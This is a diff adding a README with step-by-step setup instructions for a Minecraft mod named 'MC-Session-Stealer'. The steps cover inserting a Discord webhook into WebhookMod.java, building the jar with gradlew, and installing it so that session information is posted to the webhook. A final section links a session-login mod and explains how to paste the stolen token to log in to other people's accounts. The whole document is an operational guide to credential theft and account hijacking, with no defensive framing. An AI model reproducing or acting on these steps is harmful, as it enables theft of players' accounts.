@@ -1,0 +1,24 @@
+To set up this mod you must have Java 21 installed on your computer.
+Download the files and then go to
+src\client\java\com\example\github
+open the WebhookMod.java file in txt
+look for this line "private static final String WEBHOOK_URL = "PASTE_WEBHOOK_HERE";"
+replace "PASTE_WEBHOOK_HERE" with your discord webhook
+save the file
+go back to the main files or MC-Session-Stealer-1.20.6\MC-Session-Stealer-1.20.6
+open cmd in that directory
+in cmd type in "gradlew build" and press enter
+wait for it to download everything
+Once finished it should say "Build Successful"
+go back and go to build\libs
+you should see to .jar files
+modid-1.0.0.jar is your mod
+rename it or drag it into your minecraft mod folder
+launch the game
+and you should see your information posted in your discord server.
+
+download this mod to login to peoples accounts
+https://github.com/Majanito/Fabric-Session-Login/releases/tag/v1.2.0
+copy the token it sent you in the discord
+paste it into minecraft using the session logn mod
+Done.
